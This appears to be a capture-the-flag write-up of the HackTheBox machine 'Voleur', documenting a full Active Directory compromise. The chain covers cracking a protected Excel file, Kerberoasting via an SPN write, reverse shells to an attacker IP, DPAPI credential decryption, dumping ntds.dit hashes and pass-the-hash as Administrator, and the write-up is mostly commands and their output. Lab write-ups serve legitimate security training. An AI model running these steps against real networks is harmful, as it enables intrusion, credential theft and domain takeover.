---
title: "Voleur - HackTheBox"
description: "Crack d'un fichier Excel protégé depuis un partage SMB, Kerberoasting via WriteSPN, restauration d'un objet AD supprimé, et déchiffrement DPAPI pour obtenir les credentials finaux."
date: 2026-04-07
tags: ["active-directory", "smb", "kerberoasting", "dpapi", "windows", "medium"]
draft: false
---

![alt text](./images/{1EBAFD9A-277E-4549-8AFB-F1FDEB5ABDC7}.png)
ryan.naylor

| Name        | Password                        |
| ----------- | ------------------------------- |
| ryan.naylor | HollowOct31Nyt                  |
| svc_ldap    | M1XyC9pW7qT5Vn                  |
| svc_iis     | N5pXyW1VqM7CZ8                  |
| svc_winrm   | AFireInsidedeOzarctica980219afi |
| todd.wolfe  | NightT1meP1dg3on14              |
# SMB share
```bash
nxc smb 10.129.232.130 -k -u "ryan.naylor" -p "HollowOct31Nyt" --shares
smbclient.py -k DC.voleur.htb
> get Access_Review.xlsx
office2john.py Access_Review.xlsx 
# Cleartext password
$office$*2013*100000*256*16*a80811<SNIP>:football1
```
-> Get new users credential for svc_iss & svc_ldap
# Shell as svc_winrm
```bash
# 1. Set SPN over target account svc_winrm
bloodyAD -d -k voleur.htb -u svc_ldap -p 'M1XyC9pW7qT5Vn' --host DC.voleur.htb set object svc_winrm servicePrincipalName -v 'http/spn'
# 2. Perform kerberoasting to extract TGS hash
nxc ldap dc.voleur.htb -u svc_ldap -p 'M1XyC9pW7qT5Vn' -k --kerberoasting svc_winrm
# 3. Crack this account usiong hashcat
> svc_winrm:AFireInsidedeOzarctica980219afi
# 4. Request valid TGT for svc_winrm
getTGT.py -dc-ip 10.129.232.130 'voleur.htb/svc_winrm:AFireInsidedeOzarctica980219afi'
> [*] Saving ticket in svc_winrm.ccache
# 5. Export KRB5CCNAME env variable
export KRB5CCNAME=svc_winrm.ccache
# 6. Test connexion
nxc smb dc.voleur.htb -k --use-kcache
> [*]  x64 (name:dc) (domain:voleur.htb) (signing:True) (SMBv1:False) (NTLM:False)
> [+] VOLEUR.HTB\svc_winrm from ccache
We are svc_winrm !
# 7. Set kerboeros configuration
kinit svc_winrm
> enter PASS
klist
> check the result
# 8. Now connect as svc_winrm -> memeber of Remote Management Users
evil-winrm -i dc.voleur.htb -r voleur.htb
```
# Shell as todd.wolfe
```powershell
# Check for information in the recycle bin
Get-ADOptionalFeature 'Recycle bin Feature'
# svc_ldap user is in Restore Users group
```
## Connect as LDAP
```bash
upload RunasCs.exe
# Set up listener
rlwrap nc -lvnp 443
# Launch connexion back to our attack host
.\runas.exe svc_ldap M1XyC9pW7qT5Vn powershell -r 10.10.14.38:443
whoami
> voleur\svc_ldap
```
## Recover todd.wolfe
```bash
# 1. list deleted object
Get-ADObject -filter 'isDeleted -eq $true -and name -ne "Deleted Objects"' -includeDeletedObjects -property objectSid,lastKnownParent
Deleted           : True
DistinguishedName : CN=Todd Wolfe\0ADEL:1c6b1deb-c372-4cbb-87b1-15031de169db,CN=Deleted Objects,DC=voleur,DC=htb
LastKnownParent   : OU=Second-Line Support Technicians,DC=voleur,DC=htb
Name              : Todd Wolfe
                    DEL:1c6b1deb-c372-4cbb-87b1-15031de169db
ObjectClass       : user
ObjectGUID        : 1c6b1deb-c372-4cbb-87b1-15031de169db
objectSid         : S-1-5-21-3927696377-1337352550-2781715495-111
# 2. Restore object
Restore-ADObject -Identity 1c6b1deb-c372-4cbb-87b1-15031de169db
```
-> To get a shell as svc_todd.wolfe:
```go
rlwrap nc -lvnp 443
.\runas.exe todd.wolfe NightT1meP1dg3on14 powershell -r 10.10.14.38:443 --bypass-uac --logon-type 8
```
# Shell as jeremy.combs
-> As todd.wolfe we have Microsoft credential: `AppData\Roaming\Microsoft\Credentials`
```powershell
PS C:\IT\Second-Line Support\Archived Users\todd.wolfe\AppData\Roaming\Microsoft\Credentials> ls
Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----         1/29/2025   4:55 AM            398 772275FAD58525253490A9B0039791D3
```
-> And the masterKey is available as well
```bash
PS C:\IT\Second-Line Support\Archived Users\todd.wolfe\AppData\Roaming\Microsoft\Protect> ls
Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d---s-         1/29/2025   7:13 AM                S-1-5-21-3927696377-1337352550-2781715495-1110
```
-> Now we have to exfil this file with smbserver.py and then use DPAPI.py to decrypt the masterkey
```bash
⚡ 11:09 🔐 root@exegol-main 💻 10.10.14.38 📁 smbserver # tree
.
├── 772275FAD58525253490A9B0039791D3
└── S-1-5-21-3927696377-1337352550-2781715495-1110
    └── 08949382-134f-4c63-b93c-ce52efc0aa88

2 directories, 2 files
⚡ 11:09 🔐 root@exegol-main 💻 10.10.14.38 📁 smbserver # dpapi.py masterkey -file S-1-5-21-3927696377-1337352550-2781715495-1110/08949382-134f-4c63-b93c-ce52efc0aa88 -sid S-1-5-21-3927696377-1337352550-2781715495-1110 -password NightT1meP1dg3on14
Impacket v0.13.0.dev0+20250717.182627.84ebce48 - Copyright Fortra, LLC and its affiliated companies

[MASTERKEYFILE]
Version     :        2 (2)
Guid        : 08949382-134f-4c63-b93c-ce52efc0aa88
Flags       :        0 (0)
Policy      :        0 (0)
MasterKeyLen: 00000088 (136)
BackupKeyLen: 00000068 (104)
CredHistLen : 00000000 (0)
DomainKeyLen: 00000174 (372)

Decrypted key with User Key (MD4 protected)
Decrypted key: 0xd2832547d1d5e0a01ef271ede2d299248d1cb0320061fd5355fea2907f9cf879d10c9f329c77c4fd0b9bf83a9e240ce2b8a9dfb92a0d15969ccae6f550650a83
```
-> Now use this Masterkey to get cleartext credential
```yaml
dpapi.py credential -file 772275FAD58525253490A9B0039791D3 -key 0xd2832547d1d5e0a01ef271ede2d299248d1cb0320061fd5355fea2907f9cf879d10c9f329c77c4fd0b9bf83a9e240ce2b8a9dfb92a0d15969ccae6f550650a83
Impacket v0.13.0.dev0+20250717.182627.84ebce48 - Copyright Fortra, LLC and its affiliated companies

[CREDENTIAL]
LastWritten : 2025-01-29 12:55:19+00:00
Flags       : 0x00000030 (CRED_FLAGS_REQUIRE_CONFIRMATION|CRED_FLAGS_WILDCARD_MATCH)
Persist     : 0x00000003 (CRED_PERSIST_ENTERPRISE)
Type        : 0x00000002 (CRED_TYPE_DOMAIN_PASSWORD)
Target      : Domain:target=Jezzas_Account
Description :
Unknown     :
Username    : jeremy.combs
Unknown     : qT3V9pLXyN7W4m
```
```graphql
💻 10.10.14.38 📁 Voleur # getTGT.py -dc-ip 10.129.48.224 'voleur.htb/jeremy.combs:qT3V9pLXyN7W4m'
Impacket v0.13.0.dev0+20250717.182627.84ebce48 - Copyright Fortra, LLC and its affiliated companies

[*] Saving ticket in jeremy.combs.ccache
💻 10.10.14.38 📁 Voleur # export KRB5CCNAME=jeremy.combs.ccache
💻 10.10.14.38 📁 Voleur # nxc smb dc.voleur.htb -k --use-kcache
SMB         dc.voleur.htb   445    dc               [*]  x64 (name:dc) (domain:voleur.htb) (signing:True) (SMBv1:False) (NTLM:False)
SMB         dc.voleur.htb   445    dc               [+] VOLEUR.HTB\jeremy.combs from ccache
```
# Shell as svc_backup
```bash
# Check in Third-line support, we have id_rsa and ssh server running on port 2222
download id_rsa
chmod 600 id_rsa

ssh -i id_rsa svc_backup@DC -p 2222
```
# Shell as Administrator
```bash
# Mount command show us that the C drive is mounted in WSL
svc_backup@DC:~$ mount
C:\ on /mnt/c type drvfs (rw,noatime,uid=1000,gid=1000,case=off)
# We can now access backup dir and we have to folders
root@DC:/mnt/c/IT/Third-Line Support/Backups# ls
'Active Directory'   registry
# In registry we have SECURITY and SYSTEM and in AD we have ntds.dit
```
## Dump hashes
```swift
scp -i ../id_rsa -P 2222 'svc_backup@DC:/mnt/c/IT/Third-Line Support/Backups/Active Directory/ntds.dit' .
scp -i ../id_rsa -P 2222 'svc_backup@DC:/mnt/c/IT/Third-Line Support/Backups/registry/SYSTEM' .
scp -i ../id_rsa -P 2222 'svc_backup@DC:/mnt/c/IT/Third-Line Support/Backups/registry/SECURITY' .
```
```bash
oxdf@hacky$ secretsdump.py LOCAL -system SYSTEM -security SECURITY -ntds ntds.dit
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

[*] Target system bootKey: 0xbbdd1a32433b87bcc9b875321b883d2d
[*] Dumping cached domain logon information (domain/username:hash)
[*] Dumping LSA Secrets
[*] $MACHINE.ACC
$MACHINE.ACC:plain_password_hex:759d6c7b27b4c7c4feda8909bc656985b457ea8d7cee9e0be67971bcb648008804103df46ed40750e8d3be1a84b89be42a27e7c0e2d0f6437f8b3044e840735f37ba5359abae5fca8fe78959b667cd5a68f2a569b657ee43f9931e2fff61f9a6f2e239e384ec65e9e64e72c503bd86371ac800eb66d67f1bed955b3cf4fe7c46fca764fb98f5be358b62a9b02057f0eb5a17c1d67170dda9514d11f065accac76de1ccdb1dae5ead8aa58c639b69217c4287f3228a746b4e8fd56aea32e2e8172fbc19d2c8d8b16fc56b469d7b7b94db5cc967b9ea9d76cc7883ff2c854f76918562baacad873958a7964082c58287e2
$MACHINE.ACC: aad3b435b51404eeaad3b435b51404ee:d5db085d469e3181935d311b72634d77
[*] DPAPI_SYSTEM
dpapi_machinekey:0x5d117895b83add68c59c7c48bb6db5923519f436
dpapi_userkey:0xdce451c1fdc323ee07272945e3e0013d5a07d1c3
[*] NL$KM
 0000   06 6A DC 3B AE F7 34 91  73 0F 6C E0 55 FE A3 FF   .j.;..4.s.l.U...
 0010   30 31 90 0A E7 C6 12 01  08 5A D0 1E A5 BB D2 37   01.......Z.....7
 0020   61 C3 FA 0D AF C9 94 4A  01 75 53 04 46 66 0A AC   a......J.uS.Ff..
 0030   D8 99 1F D3 BE 53 0C CF  6E 2A 4E 74 F2 E9 F2 EB   .....S..n*Nt....
NL$KM:066adc3baef73491730f6ce055fea3ff3031900ae7c61201085ad01ea5bbd23761c3fa0dafc9944a0175530446660aacd8991fd3be530ccf6e2a4e74f2e9f2eb
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Searching for pekList, be patient
[*] PEK # 0 found and decrypted: 898238e1ccd2ac0016a18c53f4569f40
[*] Reading and decrypting hashes from ntds.dit
Administrator:500:aad3b435b51404eeaad3b435b51404ee:e656e07c56d831611b577b160b259ad2:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DC$:1000:aad3b435b51404eeaad3b435b51404ee:d5db085d469e3181935d311b72634d77:::
```
```ruby
📁 ssh_exfil # faketime "$(rdate -n 10.129.48.224 -p | awk '{print $2, $3, $4}' | date -f - "+%Y-%m-%d %H:%M:%S")" zsh
📁 ssh_exfil # nxc smb dc.voleur.htb -k -u Administrator -H e656e07c56d831611b577b160b259ad2
[*]  x64 (name:dc) (domain:voleur.htb) (signing:True) (SMBv1:False) (NTLM:False)
[+] voleur.htb\Administrator:e656e07c56d831611b577b160b259ad2 (admin)
```
## Connect as Administrator
```ruby
wmiexec.py voleur.htb/administrator@dc.voleur.htb -no-pass -hashes :e656e07c56d831611b577b160b259ad2 -k
C:>
```
749caa178b75193d8eedc063742ad54e